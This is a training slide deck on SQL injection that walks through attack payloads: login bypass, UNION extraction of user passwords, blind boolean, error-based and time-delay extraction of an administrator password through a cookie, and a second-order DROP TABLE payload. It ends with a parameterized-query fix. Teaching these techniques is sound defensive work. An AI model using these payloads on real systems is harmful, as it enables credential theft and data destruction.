---
title: "SSS: Session: SQL Injection"
revealOptions:
  background-color: 'aquamarine'
  transition: 'none'
---

# SQL Injection

* code injection technique
* one of the most common web security vulnerability

---

# Vulnerabilities

* Retrieving hidden data
* Subverting application logic
* UNION attacks
* Examining the database
* Blind SQL injection

---

## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts
SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1
```

----

## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts'--
SELECT * FROM products
WHERE category = 'Gifts'--' 
AND released = 1
```

----


## Retrieving hidden data

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
SELECT * FROM products
WHERE category = 'Gifts'
OR 1=1--'
AND released = 1
```

---

## Subverting application logic 

```
SELECT * FROM users
WHERE username = 'wiener'
AND password = 'bluecheese'
```

----

## Subverting application logic 


```
SELECT * FROM users
WHERE username = 'administrator'--'
AND password = ''
```

---

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
```

----

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
ORDER BY 1 --'
```

----


## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
UNION
SELECT 'a',NULL,NULL,NULL --'

```

----

## UNION attacks

```
SELECT * FROM products
WHERE category = 'Gifts'
UNION
SELECT username, password
FROM users --'
```

---

## Examining the database

| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

---

## Blind SQL injection

* the application does not return the results of the SQL query within its responses
* nor the details of any database errors
* can still be exploited to access unauthorized data

----

## Blind SQL injection

```
Cookie: TrackingId=xyz
```

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz'
```

If the query returns `True` we get a 'Welcome back' message, if not we don't.

----

## Blind SQL injection

```
Cookie: TrackingId=xyz' AND '1'='1
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND '1' = '1'
```

This will return `True` so we will get the 'Welcome back' message.

----

## Blind SQL injection

```
Cookie: TrackingId=xyz' AND '1'='2
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND '1' = '2'
```

This will return `False` so we won't get the 'Welcome back' message.

----

## Blind SQL injection

```
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'a
```

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'a'
```

If the 'Welcome back' message is showed then the first character is 'a' and we can start checking for the second character.
If not we try 'b', 'c', and so on until we get it right.

---

## Blind SQL injection - inducing conditional responses by triggering SQL errors

What if injecting different Boolean conditions makes no difference to the application responses?

----

## Blind SQL injection - inducing conditional responses by triggering SQL errors

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
```

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
```

----

## Blind SQL injection - inducing conditional responses by triggering SQL errors

```
Cookie: TrackingId=xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId='xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
```

---

## Blind SQL injection - time delays

What if the application catches database errors and handles them gracefully?

----

## Blind SQL injection - time delays

```
Cookie: TrackingId=xyz'; IF (1=1) WAITFOR DELAY '0:0:10'--
Cookie: TrackingId=xyz'; IF (1=2) WAITFOR DELAY '0:0:10'--
```

----

## Blind SQL injection - time delays

```
Cookie: TrackingId=xyz'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) = 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
---

## Second Order SQL Injection

```
$sql = "INSERT INTO user (username, password)  VALUES (:username, :password)";
$data = [
        'username' => $userName,
        'password' => $password,
        'first_name' => $firstName,
        'second_name' => $secondName
        ];
$stmt = $conn->prepare($sql);
$stmt->execute($data);
```

----

## Second Order SQL Injection

We use the following structure as name:

```
'; DROP TABLE user; --
```

----

## Second Order SQL Injection

```
$sql = "SELECT * FROM user WHERE username = '{$userName}'";
$stmt = $conn->query($sql);
$user = $stmt->fetch();
```

----

## Second Order SQL Injection

```
SELECT * FROM user WHERE username = ''; DROP TABLE user; --';
```

---

## How to prevent SQL injection

```
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

----

## How to prevent SQL injection

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

---

## Q&A

Thank you for participating!
